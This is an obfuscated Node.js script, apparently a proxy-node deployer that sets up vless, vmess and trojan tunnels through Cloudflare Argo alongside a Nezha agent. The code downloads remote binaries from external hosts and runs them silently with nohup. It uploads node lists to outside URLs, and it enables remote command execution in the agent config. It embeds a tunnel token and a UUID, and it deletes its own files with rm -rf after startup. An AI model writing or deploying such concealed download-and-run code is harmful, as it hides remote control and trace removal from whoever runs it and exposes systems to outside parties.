axios['post'](UPLOAD_URL+_0x134812(0x195),_0x589182,{'headers':{'Content-Type':_0x134812(_0x360f95._0xf47860)}});return _0x4d52ae&&_0x4d52ae['status']===0xc8?(console['log']('Subscription\x20uploaded\x20successfully'),_0x4d52ae):null;}catch(_0x2ab4e4){if(_0x2ab4e4[_0x134812(0x1d6)]){if(_0x2ab4e4[_0x134812(_0x360f95._0x198449)][_0x134812(_0x360f95._0x3782fd)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x134812(0x1f9)](listPath))return;const _0x272abf=fs[_0x134812(_0x360f95._0x54e564)](listPath,_0x134812(0x218)),_0x48c1ff=_0x272abf[_0x134812(_0x360f95._0x3b6ae6)]('\x0a')[_0x134812(_0x360f95._0x3b8599)](_0x211e5c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x134812(0x1b1)](_0x211e5c));if(_0x48c1ff['length']===0x0)return;const _0x3c1186=JSON[_0x134812(_0x360f95._0x83218f)]({'nodes':_0x48c1ff});try{const _0x5f4099=await axios[_0x134812(0x1be)](UPLOAD_URL+'/api/add-nodes',_0x3c1186,{'headers':{'Content-Type':_0x134812(_0x360f95._0x44b263)}});return _0x5f4099&&_0x5f4099[_0x134812(_0x360f95._0x3782fd)]===0xc8?(console['log'](_0x134812(_0x360f95._0x5d2776)),_0x5f4099):null;}catch(_0x4df661){return null;}}else return;}}function cleanFiles(){const _0xf6f7f6={_0xfac620:0x1cf,_0x5fa5a1:0x17b,_0x1fc190:0x201,_0x2826f7:0x1fb,_0x3475b0:0x182},_0x166aee={_0x31daf1:0x20b,_0x4560ca:0x212,_0x250244:0x212};setTimeout(()=>{const _0xdb72cd={_0x4fdf41:0x212,_0x19548f:0x1b3,_0x2c9c9a:0x212,_0x2f5b1f:0x205},_0x17e0a8=_0x8f62,_0x2eeb05=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2eeb05[_0x17e0a8(_0xf6f7f6._0xfac620)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2eeb05[_0x17e0a8(_0xf6f7f6._0xfac620)](phpPath);process[_0x17e0a8(_0xf6f7f6._0x5fa5a1)]===_0x17e0a8(0x174)?exec(_0x17e0a8(_0xf6f7f6._0x1fc190)+_0x2eeb05['join']('\x20')+_0x17e0a8(_0xf6f7f6._0x2826f7),_0x381a9b=>{const _0x5ba073=_0x17e0a8;console[_0x5ba073(0x20b)](),console[_0x5ba073(_0xdb72cd._0x4fdf41)](_0x5ba073(_0xdb72cd._0x19548f)),console[_0x5ba073(_0xdb72cd._0x2c9c9a)](_0x5ba073(_0xdb72cd._0x2f5b1f));}):exec('rm\x20-rf\x20'+_0x2eeb05['join']('\x20')+_0x17e0a8(_0xf6f7f6._0x3475b0),_0x2136f3=>{const _0xb9210f=_0x17e0a8;console[_0xb9210f(_0x166aee._0x31daf1)](),console[_0xb9210f(_0x166aee._0x4560ca)]('App\x20is\x20running'),console[_0xb9210f(_0x166aee._0x250244)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();function _0x346d(){const _0x3cc6ee=['2053','axios','NEZHA_SERVER','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','UPLOAD_URL','https://amd64.ssss.nyc.mn/v1','\x0a\x0atrojan://','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20','win32','split','Add\x20automatic\x20access\x20task\x20faild:\x20','17578d67-fbb8-4e90-902f-0596d0f7a997','message','unlinkSync','643375wEYuxE','platform','readFileSync','24AjCwpy','https://arm64.ssss.nyc.mn/agent','unshift','automatic\x20access\x20task\x20added\x20successfully','substring','\x20>/dev/null\x202>&1','Skipping\x20adding\x20automatic\x20access\x20task','\x20already\x20exists','211870mDSHzN','web\x20running\x20error:\x20','SERVER_PORT','Unhandled\x20error\x20in\x20startserver:','forEach','2874546GNwamD','get','tunnel.json','127.0.0.1','express','random','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','application/json','pkill\x20-f\x20\x22[','/dev/null','php\x20running\x20error:\x20','/api/add-subscriptions','https://arm64.ssss.nyc.mn/bot','42807SqFEXn','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20>/dev/null\x202>&1\x20&','CFIP','country_code','\x20-c\x20','\x20-c\x20\x22','abcdefghijklmnopqrstuvwxyz','/trojan-argo','org','listen','SUB_PATH','https://oooo.serv00.net/add-url','length','createWriteStream','Content-Type','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','charAt','fileName','\x0a\x0avmess://','arm','2083','vless','1110676mhaIZi','Error\x20in\x20startserver:','UUID','test','.exe\x20>\x20nul\x202>&1','App\x20is\x20running','filter','finish','Error\x20downloading\x20files:','close','./tmp','NAME','base64','sub','list.txt','\x20-p\x20','post','floor','\x20successfully','child_process','&path=%2Ftrojan-argo%3Fed%3D2560#','config.json','all','writeFileSync','quic','PORT','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','unlink','\x20failed:\x20','from','tunnel.yml','/config.json\x20>/dev/null\x202>&1\x20&','none','push','443','map','stream','arch','basename','catch','response','TunnelSecret','tls','error','ARGO_DOMAIN:','3NubkRB','Empowerment\x20success\x20for\x20','npm\x20running\x20error:\x20','?encryption=none&security=tls&sni=','send','chmod','\x0a\x20\x20credentials-file:\x20','then','direct','?security=tls&sni=','Error\x20executing\x20command:\x20','true','Download\x20','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','join','2096','2087','/vmess-argo','1267080tGeLPu','match','mkdirSync','readdirSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20is\x20running','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','path','&path=%2Fvless-argo%3Fed%3D2560#','1729042jVYhQi','env','existsSync','ArgoDomain:','\x20>\x20nul\x202>&1','https+local://8.8.8.8/dns-query','countryCode','ARGO_AUTH','includes','PROJECT_URL','del\x20/f\x20/q\x20','toString','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https://ipapi.co/json/','data','tcp','vmess','\x20-s\x20','clear','text/plain;\x20charset=utf-8','/vless-argo','8443','has','arm64','cf.877774.xyz','log','pop','exec','trojan','status','eyJhIjoiN2JiMDFjYWI3YWMwYTVkYmMzNDE3ZDVmYWI4NDIwMjEiLCJ0IjoiNzZmNWI3MzItZTVjMi00YWM2LThlYTEtMmUyODViN2MxMzg5IiwicyI6Ik4yTXdZMkkyT1dZdFpEZ3hPQzAwT1RSaUxUbGxPV0l0TlRCbU9EUXpaV014TjJGayJ9','utf-8','ARGO_PORT','http','/sub.txt\x20saved\x20successfully','statSync','isFile','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','http\x20server\x20is\x20running\x20on\x20port:','xtls-rprx-vision','\x22\x20>\x20/dev/null\x202>&1','CFPORT','nohup\x20','fileUrl','stringify','block'];_0x346d=function(){return _0x3cc6ee;};return _0x346d();}async function AddVisitTask(){const _0x347122={_0x27b727:0x212,_0x348443:0x1be,_0x5322c7:0x180,_0x31e71a:0x1d9,_0x1bac58:0x176},_0x276aec=_0x2ee8e0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x276aec(_0x347122._0x27b727)](_0x276aec(0x183));return;}try{const _0x5d0c46=await axios[_0x276aec(_0x347122._0x348443)](_0x276aec(0x1a3),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x276aec(0x191)}});return console['log'](_0x276aec(_0x347122._0x5322c7)),_0x5d0c46;}catch(_0x4bf006){return console[_0x276aec(_0x347122._0x31e71a)](_0x276aec(_0x347122._0x1bac58)+_0x4bf006[_0x276aec(0x178)]),null;}}async function startserver(){const _0x3bb26e={_0x18bfef:0x1af},_0x11f0ad=_0x2ee8e0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x52f969){console['error'](_0x11f0ad(_0x3bb26e._0x18bfef),_0x52f969);}}startserver()[_0x2ee8e0(0x1d5)](_0x3a2f33=>{const _0x2446b5={_0x40aed7:0x1d9},_0xd5df52=_0x2ee8e0;console[_0xd5df52(_0x2446b5._0x40aed7)](_0xd5df52(0x188),_0x3a2f33);}),app[_0x2ee8e0(0x1a1)](PORT,()=>console[_0x2ee8e0(0x212)](_0x2ee8e0(0x21f)+PORT+'!'));
